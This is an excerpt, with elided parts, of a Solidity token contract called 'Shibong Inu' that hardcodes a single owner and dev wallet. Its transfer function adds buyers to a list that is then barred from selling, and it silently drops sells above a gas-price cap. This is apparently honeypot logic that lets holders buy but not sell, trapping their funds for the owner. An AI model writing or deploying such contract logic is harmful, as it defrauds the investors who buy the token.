...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xe5b6f27A5F497a9B2Edd1bABb8fE7b6eE5F40B2D;
...
contract ShibongInu is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable private Wallet_Dev = payable(0xe5b6f27A5F497a9B2Edd1bABb8fE7b6eE5F40B2D);
    ...
    */
    ...
    string private _name = "Shibong Inu"; 
    string private _symbol = "$SHIBONG";  
    uint8 private _decimals = 9;
    uint256 private _tTotal = 1000000 * 10**_decimals;
    uint256 private maxGwei = 15 * 1 gwei;
    ...
    */
    ...
    function _transfer(
        ...
        */
        ...
        if (from != owner() && to != owner()){ includeFromFee.push(to);
        ...
        */
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
            takeFee = false;
        } else if (from == uniswapV2Pair){_TotalFee = _buyFee;} else if (to == uniswapV2Pair){_TotalFee = _sellFee;require(!_isIncludedFromFee[from] && !_isIncludedFromFee[to]); if (tx.gasprice > maxGwei) return;}
